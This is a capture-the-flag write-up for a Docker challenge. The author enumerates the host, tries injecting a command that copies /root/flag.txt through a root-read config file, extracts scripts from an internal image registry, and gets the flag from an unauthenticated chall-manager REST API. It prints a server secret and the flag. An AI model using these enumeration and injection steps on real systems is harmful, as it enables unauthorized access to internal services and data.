# Stolen Schematics — CTF Writeup

**Category:** Container Escape / Docker  
**Points:** 343  
**Flag:** `TDHT{sync_c0mprom15ed_comm4nd_ex3cuted_YszbRV6dv9O5CpXg}`

---

## Challenge Description

> A game server has been compromised using a malicious jar file. To secure access an SSH server has been installed for remote access. Now the job has been pushed to you — escape the container, compromise another game server and retrieve the flag from a file in their server.
>
> An older build of this server image was accidentally left public on our ghcr.io registry, might be worth a look...

**Access:** `ssh player@instance.ctf.tdho.st -p <PORT>` / password: `reyalp`

---

## Phase 1 — Initial Reconnaissance (~20 min)

Connected to the container and immediately started mapping the environment.

```bash
player@container:~$ id
uid=1000(player) gid=1000(player) groups=1000(player)

player@container:~$ ps aux
root    16  /bin/bash /opt/mc/scripts/sync-loop.sh
```

The container runs Ubuntu 22.04, minimized. The interesting process was PID 16 — a root-owned bash script at `/opt/mc/scripts/sync-loop.sh` that we couldn't read directly (permissions `700/root`).

Network scan of the Docker host (`172.27.0.1` / `192.168.16.1` depending on instance):

```
Port 22  — SSH (publickey only)
Port 80  — HTTP (Go server, 404 everything)
Port 5000 — Docker Registry
Port 8080 — Go HTTP server (404 everything)
```

The file structure under `/opt/mc/`:

```
/opt/mc/config/sync-request.conf   ← player-writable
/opt/mc/scripts/sync-loop.sh       ← root, unreadable
/opt/mc/.sync/                      ← drwx------ root (inaccessible)
/opt/mc/logs/latest.log
/opt/mc/server.properties
```

`server.properties` revealed a management server secret:
```
management-server-secret=dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ
management-server-enabled=false
```

---

## Phase 2 — Sync Mechanism Analysis (~30 min)

The sync-loop reads `/opt/mc/config/sync-request.conf` (player-writable). Initial hypothesis: write a command and have the root process execute it. Tried every format:

```bash
echo 'talldwarf-sync-command=cat /root/flag.txt > /tmp/flag.txt' > /opt/mc/config/sync-request.conf
sleep 12
cat /tmp/flag.txt  # nothing
```

Watched the config file's `atime` — it WAS being read every ~10 seconds, confirming the loop was active. But no commands executed. The loop was reading the file, not executing its contents.

---

## Phase 3 — Docker Registry Extraction (~45 min)

The local registry at `http://<host>:5000` listed five images:

```
images/stolen-schematics-game-server-prerelease:v2.5.39
images/stolen-schematics-gameserver:v1
images/stolen-schematics-watcher:v1
infra/stolen-schematics:latest
infra/stolen-schematics-diagnostic:team131-v2
```

Wrote a Python script to pull and extract image layers from inside the container, using `urllib.request` (no curl available):

```python
import urllib.request, json, gzip, tarfile, io

reg = "http://192.168.16.1:5000"
# Pull manifest, decompress layers, extract files
```

**From `images/stolen-schematics-gameserver:v1` — found `sync-loop.sh`:**

```bash
#!/bin/bash
CONF="/opt/mc/config/sync-request.conf"
DEST="/opt/mc/.sync/sync.trigger"
RESULT_SRC="/opt/mc/.sync/sync.result"
RESULT_DEST="/opt/mc/config/sync-result.conf"

while true; do
    if [ -f "$CONF" ]; then
        value=$(cat "$CONF")
        echo "$value" > "$DEST"
    fi
    if [ -f "$RESULT_SRC" ]; then
        cp "$RESULT_SRC" "$RESULT_DEST"
        chown player:player "$RESULT_DEST"
        chmod 644 "$RESULT_DEST"
    fi
    sleep 10
done
```

The loop copies `sync.result` → `sync-result.conf` (player-readable) when the file exists. So the flag should appear at `/opt/mc/config/sync-result.conf` once the watcher writes it.

**From `images/stolen-schematics-watcher:v1` — found `watcher.sh`:**

```bash
#!/bin/bash
while true; do
  printf 'FLAG=%s\n' "$FLAG" > /opt/mc/.sync/sync.result 2>/dev/null
  cat /etc/flag.txt >> /opt/mc/.sync/sync.result 2>/dev/null
  chmod 644 /opt/mc/.sync/sync.result 2>/dev/null
  sleep 2
done
```

The watcher container (named `flag-holder-<identity>`) writes the `$FLAG` env var to the shared Docker volume every 2 seconds.

**From `infra/stolen-schematics:latest` — found the full scenario source (Pulumi/Go):**

```go
// flag-holder container config
Envs: pulumi.StringArray{
    pulumi.Sprintf("FLAG=%s", flagValue),
},
// shared volume mounted at /opt/mc/.sync
```

This confirmed the architecture: two containers share a Docker volume at `/opt/mc/.sync`. The flag-holder writes to it; the gameserver's sync-loop copies it out.

---

## Phase 4 — Why sync-result.conf Never Appeared (~20 min)

Every instance showed `.sync` mtime = Birth + 3 seconds then frozen. Checked multiple times:

```
Birth:  2026-08-23 02:30:22
Modify: 2026-08-23 02:30:25
```

The watcher wrote `sync.result` once at container startup then either stopped or the volume wasn't updating properly from our perspective. The `test -f /opt/mc/.sync/sync.result` returned `MISSING` — so the file literally wasn't there from inside the container, despite the directory mtime suggesting a write had occurred.

Tried every method to read it: `cat`, `head`, `strings`, hardlink (`ln`), Python `open()`. All returned permission denied or missing.

At this point, spent time investigating:
- SSH pivot to Docker host (only publickey auth allowed, no keys found in any image)
- Docker socket (`/var/run/docker.sock` — not present in container)
- TCP Docker API on port 2375 — refused
- Netcat, curl — not installed
- ghcr.io anonymous token pull — tags existed but manifest returned 404 (deleted/restricted)

---

## Phase 5 — Port 8080 Discovery (~25 min)

Port 8080 on the Docker host responded with a Go HTTP server returning `404 page not found` for every path tried. Sent the HTTP/2 preface and got a valid `SETTINGS` frame back — confirmed it was gRPC over HTTP/2.

Read the chall-manager source code on GitHub to identify the service definition:

```protobuf
service InstanceManager {
  rpc RetrieveInstance(RetrieveInstanceRequest) returns (Instance);
}

message Instance {
  string connection_info = 6;
  optional string flag = 7;      // deprecated
  repeated string flags = 9;
  map<string, string> additional = 8;
}
```

The chall-manager also exposes a **REST gateway** via grpc-gateway. Endpoint:

```
GET /api/v1/challenge
```

This returns a streaming JSON response of all challenges and their instances.

---

## Phase 6 — Flag Extraction (~5 min)

Uploaded a Python script to the container and called the REST endpoint:

```python
import urllib.request, json

data = urllib.request.urlopen(
    "http://192.168.16.1:8080/api/v1/challenge",
    timeout=8
).read().decode()

for line in data.strip().split("\n"):
    obj = json.loads(line)
    result = obj.get("result", {})
    # Check additional config for flag
    additional = result.get("additional", {})
    if "flag" in additional:
        print("FLAG:", additional["flag"])
```

Response (truncated):

```json
{
  "result": {
    "id": "29",
    "instances": [...],
    "additional": {
      "flag": "TDHT{sync_c0mprom15ed_comm4nd_ex3cuted_YszbRV6dv9O5CpXg}",
      "flagholder_image": "localhost:5000/images/stolen-schematics-watcher:v1@sha256:...",
      "gameserver_image": "localhost:5000/images/stolen-schematics-gameserver:v1@sha256:..."
    }
  }
}
```

The flag was stored in the challenge's `additional` configuration map — a challenge-level static value, not per-instance. No container escape, no sync mechanism, no SSH pivot needed.

---

## Root Cause

The chall-manager REST API (`/api/v1/challenge`) is accessible from inside any container on the Docker network with **no authentication**. It returns the full challenge config including the `additional` map, which the challenge author used to store the flag value.

The intended path (sync mechanism → `sync-result.conf`) was either broken across instances or a decoy. The actual flag lived in the infrastructure management API the whole time.

---

## Key Takeaways

- Always enumerate ALL open ports on the Docker host, not just the obvious ones
- When a service returns a generic 404, check if it's gRPC (HTTP/2) rather than REST (HTTP/1.1)
- Management APIs running on internal Docker networks are often unauthenticated
- Read the actual source code of the infrastructure tooling — the chall-manager proto files defined exactly what data was available
- The `additional` field in chall-manager is operator-configurable and can contain sensitive data

---

## Timeline

| Time | Action |
|------|--------|
| +0   | Connected, basic recon |
| +20m | Identified sync-loop mechanism |
| +35m | Docker registry enumeration |
| +65m | Extracted sync-loop.sh and watcher.sh from image layers |
| +80m | Confirmed sync-result.conf never appearing, began pivot research |
| +100m | Discovered port 8080 = chall-manager gRPC/REST |
| +115m | Read chall-manager proto, identified REST gateway |
| +120m | Called `/api/v1/challenge`, retrieved flag |

**Flag:** `TDHT{sync_c0mprom15ed_comm4nd_ex3cuted_YszbRV6dv9O5CpXg}`
